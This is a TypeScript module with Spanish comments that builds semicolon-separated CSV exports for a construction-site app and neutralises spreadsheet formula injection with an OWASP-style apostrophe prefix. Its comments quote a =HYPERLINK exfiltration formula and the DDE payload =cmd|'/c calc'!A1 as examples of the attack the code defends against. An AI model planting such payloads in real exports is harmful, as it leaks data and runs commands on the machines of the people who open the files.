/**
 * El ÚNICO sitio donde se arma un CSV.
 *
 * Había dos copias de esta función —una para los listados del tablero y otra para el parte de
 * obra— y las dos hacían lo mismo a medias. Una copia repetida es una copia que un día se arregla
 * sola por un lado.
 */

/**
 * Los cuatro caracteres con los que Excel, LibreOffice y Google Sheets entienden que una celda
 * es una FÓRMULA y no un texto.
 *
 * `+` y `-` están porque también arrancan fórmula (`-2+3` da 1), y `@` porque es como se llama a
 * una función en el Excel viejo.
 */
const ARRANQUE_DE_FORMULA = /^[=+\-@]/;

/** Los separadores que algunas versiones de Excel tragan antes de mirar el primer carácter. */
const ARRANQUE_INVISIBLE = /^[\t\r]/;

/**
 * Deja una celda como TEXTO, pase lo que pase.
 *
 * Un CSV es texto plano y la hoja de cálculo se lo cree entero. Si una celda empieza por `=`, al
 * abrir el archivo Excel no enseña ese texto: EJECUTA lo que ponga. Aquí eso no es teórico: el
 * parte de obra lleva la nota que se escribe en la cubierta y la lista de materiales lleva la
 * descripción de cada aparato, que puede venir de un proyecto que mandó otro. Una nota que diga
 *
 *     =HYPERLINK("http://…?"&A1;"pincha aquí")
 *
 * se convierte, al abrir el parte que se manda por correo, en un enlace que se lleva el contenido
 * de la hoja. Y `=cmd|'/c calc'!A1` es el clásico de los DDE.
 *
 * La regla es la que recomienda OWASP: si la celda empieza por uno de esos caracteres, se le pone
 * delante un apóstrofo. La hoja de cálculo lo entiende como «esto es texto» y NO lo muestra, así
 * que la celda se lee exactamente igual que antes; lo único que cambia es que ya no se ejecuta.
 *
 * Un número normal (`-5`, `+3`) sí lleva signo, y por eso se deja pasar: lo que se neutraliza es
 * lo que empieza por signo y NO es un número.
 */
export function celdaSegura(valor: string | number | undefined): string {
	if (valor === undefined || valor === null) return '';
	const s = String(valor);
	if (s === '') return '';
	// Un número de verdad no es una fórmula: «-5», «+3,5» y «-1.2e3» se quedan como están.
	if (typeof valor === 'number' || /^[+-]?\d+([.,]\d+)?([eE][+-]?\d+)?$/.test(s)) return s;
	return ARRANQUE_DE_FORMULA.test(s) || ARRANQUE_INVISIBLE.test(s) ? `'${s}` : s;
}

/**
 * Arma un CSV con `;` de separador —el que espera Excel en español— y comillas donde hagan falta.
 *
 * Cada celda pasa antes por `celdaSegura`.
 */
export function aCSV(filas: (string | number | undefined)[][]): string {
	return filas
		.map((fila) => fila
			.map((celda) => {
				const s = celdaSegura(celda);
				return /[";\n]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
			})
			.join(';'))
		.join('\n');
}
